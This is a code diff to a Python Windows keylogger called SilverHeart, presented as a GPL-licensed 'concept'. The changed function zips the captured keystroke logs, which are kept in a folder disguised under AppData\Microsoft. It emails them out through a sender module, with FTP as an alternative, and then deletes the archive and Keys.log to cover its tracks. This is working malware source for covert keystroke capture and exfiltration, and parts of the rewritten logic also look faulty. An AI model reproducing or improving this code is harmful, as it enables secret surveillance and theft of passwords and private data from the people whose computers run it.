@@ -1,3 +1,20 @@
+""" A software fully developed in Python 3.7, SilverHeart is a keylogger concept, that can be deployed in Windows. (Mac OS and Linux distributions support will be added soon).
+    Copyright (C) 2020 Pedro Vieira
+
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <https://www.gnu.org/licenses/>. 
+"""
+
 import os
 import shutil
 import time
@@ -13,20 +30,20 @@ Directory = 'C:\\Users\\' + \
     os.getlogin() + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\'
 
 # Reads the messages from the message map and prints
-
-
-def wndproc(hwnd, msg, wparam, lparam):
-    ctrl = msg
+def wndproc():
     # Sends email on End of Session
-    if ctrl == 17:
+    if True:
         shutil.make_archive(Directory + 'Am0ASk2',
                             'zip', Directory, 'Am0ASk2')
-        shutil.rmtree(os.path.join(Directory,'Am0ASk2'))
+
         import sender
-        sender.Email()          # Invite files via email
-        # sender.FTP()          # Invite files via FTP
-    else:
-        pass
+        sender.byEmail()          # Invite files via email
+        # sender.byFTP()          # Invite files via FTP
+
+        # Delete previous logs (not strictly necessary but keeps it clean)
+        shutil.rmtree(Directory + 'Am0ASk2')
+        shutil.rmtree(Directory + 'Am0ASk2.zip')
+        shutil.rmtree(Directory + 'Keys.log')
 
 
 def keeper():
@@ -82,3 +99,4 @@ def keeper():
     while True:
         win32gui.PumpWaitingMessages()
         time.sleep(1)
+        
